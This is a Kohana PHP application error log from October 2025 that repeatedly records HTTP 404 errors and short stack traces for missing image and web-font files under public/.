2025-10-24 18:59:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/account_settings_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:57 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/account_settings_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:57 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/account_settings_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/myriadpro/myriadpro-regular.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/myriadpro/myriadpro-regular.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/myriadpro/myriadpro-regular.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/myriadpro/myriadpro-regular.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/myriadpro/myriadpro-regular.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/myriadpro/myriadpro-regular.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/invoice_left_top_tag.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/invoice_left_top_tag.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/blue_button_lr_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/blue_button_lr_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/myriadpro/myriadpro-regular.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/myriadpro/myriadpro-regular.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/helveticaneue-condensed/helveticaneue-condensed-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/helveticaneue-condensed/helveticaneue-condensed-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/helveticaneue-condensed/helveticaneue-condensed-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/helveticaneue-condensed/helveticaneue-condensed-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/helveticaneue-condensed/helveticaneue-condensed-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/helveticaneue-condensed/helveticaneue-condensed-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/helveticaneue-condensed/helveticaneue-condensed-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/helveticaneue-condensed/helveticaneue-condensed-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/spirit_images2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/spirit_images2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/tooltip_window_text.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/tooltip_window_text.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/spirit_images.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/spirit_images.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inv_menu_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inv_menu_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_hover-left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_hover-left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_pos_bot.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_pos_bot.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_field_bg_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_field_bg_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_text_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_text_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_hover_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_hover_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_text_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_text_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/white_but_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/white_but_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/white_but_lr.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/white_but_lr.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_hover_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_hover_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/left_menu_arr.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/left_menu_arr.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_corner_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_corner_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/arroe_bottom_glow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/arroe_bottom_glow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ad_scroll_forward.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ad_scroll_forward.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/product_details_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/product_details_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_field_bg_lr.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_field_bg_lr.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/background_shine.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/background_shine.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_area_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_area_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/buy_green_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/buy_green_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edition_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edition_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/con_bor_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/con_bor_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yellow_round.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/yellow_round.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bg_layout_white.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bg_layout_white.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/editr_bg_small.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/editr_bg_small.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inv_box_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inv_box_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/blue_button_lr.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/blue_button_lr.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/left_box_title.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/left_box_title.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ad_scroll_back.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/ad_scroll_back.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/buy_green_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/buy_green_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/con_bor_bottom.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/con_bor_bottom.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/vedio_bg_tb.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/vedio_bg_tb.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_area_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_area_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/buy_green_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/buy_green_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_rft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_rft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/blue_button_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/blue_button_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/layout_html_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/layout_html_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_area_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/text_area_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:00:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:00:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_pos_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_pos_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/title_top_new.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/title_top_new.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/box_top_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/box_top_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_pos_top.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_pos_top.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inv_menu_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inv_menu_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/vedio_bg_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/vedio_bg_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/background.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/background.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/header_lock.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/header_lock.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/content_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/content_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/textbox_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/textbox_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/layout_part.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/layout_part.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
